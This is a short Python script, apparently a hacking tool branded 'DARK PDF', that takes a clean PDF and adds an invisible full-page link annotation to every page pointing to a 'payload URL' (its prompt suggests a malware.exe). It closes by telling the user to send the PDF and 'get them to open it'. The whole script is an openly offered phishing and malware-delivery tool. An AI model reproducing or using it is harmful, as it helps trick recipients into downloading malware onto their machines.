import os
import random
import string
import pypdf
from pypdf.generic import NameObject, DictionaryObject, TextStringObject, ArrayObject

# 🎨 Console Colors
RED, GREEN, YELLOW, RESET = '\033[91m', '\033[92m', '\033[93m', '\033[0m'

def banner():
    print(f"""{YELLOW}
    ██████╗  █████╗ ██████╗ ██╗  ██╗    ██████╗ ██████╗ ███████╗
    ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝    ██╔══██╗██╔══██╗██╔════╝
    ██║  ██║███████║██████╔╝█████╔╝     ██████╔╝██║  ██║█████╗  
    ██║  ██║██╔══██║██╔══██╗██╔═██╗     ██╔═══╝ ██║  ██║██╔══╝  
    ██████╔╝██║  ██║██║  ██║██║  ██╗    ██║     ██████╔╝██║     
    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝     ╚═════╝ ╚═╝{RESET}
    """)

def get_user_input():
    print(f"{GREEN}[+] Enter the required details:{RESET}")
    payload_url = input("Enter direct payload URL (e.g., https://yourserver.com/malware.exe): ").strip()
    input_pdf = input("Enter the clean PDF file: ").strip()
    output_pdf = input("Enter the final output PDF name: ").strip()
    return payload_url, input_pdf, output_pdf

def inject_payload_link(input_pdf, output_pdf, payload_url):
    print(f"{YELLOW}[+] Injecting hidden payload link into PDF...{RESET}")

    pdf_reader = pypdf.PdfReader(input_pdf)
    pdf_writer = pypdf.PdfWriter()

    for page in pdf_reader.pages:
        pdf_writer.add_page(page)

        annotation = DictionaryObject()
        annotation.update({
            NameObject("/Type"): NameObject("/Annot"),
            NameObject("/Subtype"): NameObject("/Link"),
            NameObject("/Rect"): ArrayObject([10, 10, 600, 800]),  # Clickable area
            NameObject("/Border"): ArrayObject([0, 0, 0]),
            NameObject("/A"): DictionaryObject({
                NameObject("/S"): NameObject("/URI"),
                NameObject("/URI"): TextStringObject(payload_url)
            })
        })

        if "/Annots" in page:
            page[NameObject("/Annots")].append(annotation)
        else:
            page[NameObject("/Annots")] = ArrayObject([annotation])

    with open(output_pdf, "wb") as output_file:
        pdf_writer.write(output_file)

    print(f"{GREEN}[✔] Payload link embedded successfully!{RESET}")

# 🚀 MAIN EXECUTION 🚀
if __name__ == "__main__":
    banner()
    payload_url, input_pdf, output_pdf = get_user_input()
    inject_payload_link(input_pdf, output_pdf, payload_url)
    print(f"{GREEN}[✔] FINAL PDF Created: {output_pdf} ✅{RESET}")
    print(f"{GREEN}[✔] Send the PDF and get them to open it!{RESET}")
